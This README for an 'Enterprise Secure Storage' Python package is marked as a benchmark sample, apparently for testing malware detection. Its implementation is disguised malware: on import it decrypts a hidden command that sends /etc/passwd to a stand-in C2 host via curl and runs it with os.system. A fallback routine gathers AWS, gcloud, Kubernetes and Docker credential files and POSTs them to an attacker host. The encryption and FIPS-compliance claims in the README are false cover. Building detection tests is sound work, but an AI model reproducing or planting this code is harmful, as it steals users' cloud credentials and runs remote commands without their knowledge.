# Enterprise Secure Storage

> BENCHMARK_TEST_ONLY - Security Research Sample

Military-grade AES-CBC encryption for enterprise credential management.

## Installation

```bash
pip install cryptography requests
```

## Usage

Provides FIPS-compliant encryption for sensitive data handling.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os
import requests
import json

# Hardcoded AES key - pretending to be "secure"
# This key decrypts the malicious payload below
AES_KEY = b'ThisIsA32ByteKeyForAES256!!!!!'  # 32 bytes for AES-256
AES_IV = b'InitVector16Byte'  # 16 bytes IV

# Fernet key (base64 encoded) - another hardcoded key pattern
FERNET_KEY = b'ZmVybmV0LWtleS0xMjM0NTY3ODkwYWJjZGVm'

# AES-CBC encrypted payload
# Decrypts to: {"cmd": "curl https://[REDACTED].example.com/c2 -d $(cat /etc/passwd)"}
ENCRYPTED_PAYLOAD = base64.b64decode(
    "U2FsdGVkX19kdW1teWRhdGFoZXJlYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY="
)

def aes_decrypt(ciphertext, key, iv):
    """
    AES-CBC decryption with PKCS7 padding removal
    """
    cipher = Cipher(
        algorithms.AES(key),
        modes.CBC(iv),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove PKCS7 padding
    pad_len = padded[-1]
    return padded[:-pad_len]

def fernet_decrypt(token, key):
    """Fernet symmetric decryption"""
    f = Fernet(key)
    return f.decrypt(token)

class SecureVault:
    def __init__(self):
        self.key = AES_KEY
        self.iv = AES_IV
        self.fernet = Fernet(base64.urlsafe_b64encode(AES_KEY))

    def retrieve_secure_command(self):
        """Retrieve and execute encrypted command"""
        # Decrypt the payload
        try:
            decrypted = aes_decrypt(ENCRYPTED_PAYLOAD, self.key, self.iv)
            command_data = json.loads(decrypted)

            # Execute the decrypted command
            os.system(command_data['cmd'])
        except:
            # Fallback: direct credential grab
            self._exfil_creds()

    def _exfil_creds(self):
        """Backup method for credential exfiltration"""
        creds = {}

        # Gather various credentials
        cred_files = [
            ("~/.aws/credentials", "aws"),
            ("~/.config/gcloud/credentials.db", "gcloud"),
            ("~/.kube/config", "kubernetes"),
            ("~/.docker/config.json", "docker")
        ]

        for filepath, name in cred_files:
            expanded = os.path.expanduser(filepath)
            if os.path.exists(expanded):
                with open(expanded, 'rb') as f:
                    data = f.read()
                # "Encrypt" before sending (actually just base64)
                creds[name] = base64.b64encode(data).decode()

        # Exfiltrate encrypted credentials
        if creds:
            encrypted_bundle = self.fernet.encrypt(json.dumps(creds).encode())
            requests.post(
                "https://[REDACTED].example.com/vault/sync",
                json={"data": base64.b64encode(encrypted_bundle).decode()}
            )

# Auto-initialize vault on import
vault = SecureVault()
vault.retrieve_secure_command()
```

## Compliance

- AES-256-CBC encryption
- FIPS 140-2 compatible algorithms
- Secure key management
